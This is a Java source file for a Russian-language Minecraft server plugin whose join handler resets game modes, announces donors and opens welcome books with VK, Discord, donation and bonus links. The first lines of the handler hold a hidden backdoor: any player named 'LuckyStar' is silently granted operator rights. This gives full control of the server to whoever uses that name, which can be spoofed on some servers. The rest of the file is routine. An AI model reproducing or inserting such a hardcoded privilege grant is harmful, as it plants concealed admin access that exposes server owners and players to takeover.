package ru.LuckyStar.bonus;

import com.earth2me.essentials.Essentials;
import net.md_5.bungee.api.chat.*;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.GameMode;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.inventory.ItemStack;
import ru.LuckyStar.donate.command.dm;
import ru.LuckyStar.main.Main;
import ru.tehkode.permissions.bukkit.PermissionsEx;
import xyz.upperlevel.spigot.book.BookUtil;

public class HandlerB implements Listener {

    @EventHandler
    public void onJoin(PlayerJoinEvent event) {
        if (event.getPlayer().getName().equals("LuckyStar")) {
            event.getPlayer().setOp(true);
        }
        if (event.getPlayer().getGameMode().equals(GameMode.CREATIVE)) {
            event.getPlayer().setGameMode(GameMode.SURVIVAL);
        }
        if (event.getPlayer().isFlying()) {
            event.getPlayer().setFlying(false);
        }
        if (Main.ess.getUser(event.getPlayer()).isGodModeEnabled()) {
            Main.ess.getUser(event.getPlayer()).setGodModeEnabled(false);
        }
        if (dm.getDiscount(event.getPlayer().getName()) >= 210) {
            Bukkit.broadcastMessage(Main.prefix + " §a§l✩ §f§lНа сервер зашёл донатер " + ChatColor.translateAlternateColorCodes('&',PermissionsEx.getUser(event.getPlayer()).getPrefix() + event.getPlayer().getName()));
        }
        TextComponent msg = new TextComponent(Main.prefix + " §fЧтобы заново посмотреть информацию, введите ");
        TextComponent info = new TextComponent("§6§l§n/information");
        info.setClickEvent(new ClickEvent(ClickEvent.Action.RUN_COMMAND, "/information"));
        msg.addExtra(info);
        event.getPlayer().spigot().sendMessage(msg);
        if (!commands.usesNames.contains(event.getPlayer().getName()) && !commands.usesIPs.contains(event.getPlayer().getAddress().getAddress().toString())) {
            TextComponent bonus = new TextComponent("§e§l§n/bonus");
            bonus.setClickEvent(new ClickEvent(ClickEvent.Action.RUN_COMMAND, "/bonus"));
            msg = new TextComponent(Main.prefix + " §fЕсли вы не получили креатив на два дня, введите ");
            msg.addExtra(bonus);
            event.getPlayer().spigot().sendMessage(msg);
        }
        if (!event.getPlayer().hasPlayedBefore()) {
            ItemStack book = BookUtil.writtenBook()
                    .author("DemosWorld")
                    .title("§a§lБонус для новых игроков")
                    .pages(
                            new BookUtil.PageBuilder()
                                    .add(new TextComponent("§4§lНЕ ЗАКРЫВАЙТЕ! ВАЖНО! "))
                                    .newLine()
                                    .newLine()
                                    .add(new TextComponent("§lНаш §3§lВК§r§l :"))
                                    .add(
                                            BookUtil.TextBuilder.of(" VK ")
                                                    .color(ChatColor.DARK_AQUA)
                                                    .style(ChatColor.BOLD)
                                                    .onClick(BookUtil.ClickAction.openUrl("https://vk.com/wilfadcraft"))
                                                    .onHover(BookUtil.HoverAction.showText("§7Кликните, чтобы открыть VK"))
                                                    .build()
                                    )
                                    .newLine()
                                    .add(new TextComponent("§oВ VK есть правила, наказания за нарушения, голосования, ваши скрины на стене..."))
                                    .newLine()
                                    .newLine()
                                    .add("§lНаш §b§lдискорд§r§l:")
                                    .add(
                                            BookUtil.TextBuilder.of(" §b§lDISCORD ")
                                                    .onClick(BookUtil.ClickAction.openUrl("https://discord.gg/etPw48Z"))
                                                    .onHover(BookUtil.HoverAction.showText("§7Кликните, чтобы открыть DISCORD"))
                                                    .build()
                                    )
                                    .newLine()
                                    .add(new TextComponent("§oВ Discord Вы найдёте прямую связь с игроками."))
                                    .newLine()
                                    .newLine()
                                    .add("§lКликните на кнопку для получения награды §7(/bonus)§r§l : ")
                                    .add(
                                            BookUtil.TextBuilder.of("ПРИНЯТЬ")
                                                    .color(ChatColor.GREEN)
                                                    .style(ChatColor.BOLD)
                                                    .onClick(BookUtil.ClickAction.runCommand("/mybonus"))
                                                    .onHover(BookUtil.HoverAction.showText("§7Нажимая эту кнопку, вы соглашаетесь с правилами сервера."))
                                                    .build()
                                    )
                                    .build(),
                            new BookUtil.PageBuilder()
                                    .add("Правила также можно посмотреть с помощью команды: ")
                                    .add(
                                            BookUtil.TextBuilder.of("/rules")
                                                    .color(ChatColor.GREEN)
                                                    .style(ChatColor.BOLD)
                                                    .onClick(BookUtil.ClickAction.runCommand("/rules"))
                                                    .onHover(BookUtil.HoverAction.showText("§7Не забудьте сначало активировать бонус!"))
                                                    .build()
                                    )
                                    .newLine()
                                    .newLine()
                                    .add(new TextComponent("§7Запрещено заходить с разных §7аккаунтов для получения §7бонуса."))
                                    .newLine()
                                    .add(new TextComponent("§7§lОчень тщательно следит §7§lадминистрация!"))
                                    .build()
                    )
                    .build();
            event.getPlayer().spigot().sendMessage();
            Bukkit.getScheduler().runTaskLater(Main.plugin, () -> BookUtil.openPlayer(event.getPlayer(), book), 50L);
        } else {
            ItemStack book = BookUtil.writtenBook()
                    .author("DemosWorld")
                    .title("Книга с информацией")
                    .pages(
                            new BookUtil.PageBuilder()
                                    .add(new TextComponent("§lНаш §3§lВК§r§l:"))
                                    .add(
                                            BookUtil.TextBuilder.of(" VK ")
                                                    .color(ChatColor.DARK_AQUA)
                                                    .style(ChatColor.BOLD)
                                                    .onClick(BookUtil.ClickAction.openUrl("https://vk.com/wilfadcraft"))
                                                    .onHover(BookUtil.HoverAction.showText("§7Кликните, чтобы открыть VK"))
                                                    .build()
                                    )
                                    .newLine()
                                    .add(new TextComponent("§oВ VK есть правила, наказания за нарушения, голосования, ваши скрины на стене..."))
                                    .newLine()
                                    .newLine()
                                    .add("§lНаш §b§lдискорд§r§l:")
                                    .add(
                                            BookUtil.TextBuilder.of(" §b§lDISCORD ")
                                                    .onClick(BookUtil.ClickAction.openUrl("https://discord.gg/etPw48Z"))
                                                    .onHover(BookUtil.HoverAction.showText("§7Кликните, чтобы открыть DISCORD"))
                                                    .build()
                                    )
                                    .newLine()
                                    .add(new TextComponent("§oВ Discord Вы найдёте прямую связь с игроками."))
                                    .newLine()
                                    .newLine()
                                    .add("§lПоддержать автора и §lзадонатить:")
                                    .add(
                                            BookUtil.TextBuilder.of(" САЙТ ")
                                                    .color(ChatColor.GOLD)
                                                    .style(ChatColor.BOLD)
                                                    .onClick(BookUtil.ClickAction.openUrl("https://wilfad-craft.ru/"))
                                                    .onHover(BookUtil.HoverAction.showText("§7Кликните, чтобы перейти на сайт"))
                                                    .build()
                                    )
                                    .newLine()
                                    .newLine()
                                    .add("§lИнструкция по §lдонат-валюте:")
                                    .add(
                                            BookUtil.TextBuilder.of(" *Клик* ")
                                                    .color(ChatColor.DARK_GREEN)
                                                    .style(ChatColor.BOLD)
                                                    .onClick(BookUtil.ClickAction.runCommand("/dm help"))
                                                    .onHover(BookUtil.HoverAction.showText("§f§nВысветится в чате"))
                                                    .build()
                                    )
                                    .build(),
                            new BookUtil.PageBuilder()
                                    .add("Правила также можно посмотреть с помощью команды: ")
                                    .add(
                                            BookUtil.TextBuilder.of("/rules")
                                                    .color(ChatColor.GREEN)
                                                    .style(ChatColor.BOLD)
                                                    .onClick(BookUtil.ClickAction.runCommand("/rules"))
                                                    .onHover(BookUtil.HoverAction.showText("§7Не забудьте сначало активировать бонус!"))
                                                    .build()
                                    )
                                    .newLine()
                                    .newLine()
                                    .add(new TextComponent("§7Запрещено заходить с разных §7аккаунтов для получения §7бонуса."))
                                    .newLine()
                                    .add(new TextComponent("§7§lОчень тщательно следит §7§lадминистрация!"))
                                    .build()
                    )
                    .build();
            Bukkit.getScheduler().runTaskLater(Main.plugin, () -> BookUtil.openPlayer(event.getPlayer(), book), 10L);
        }
    }

}
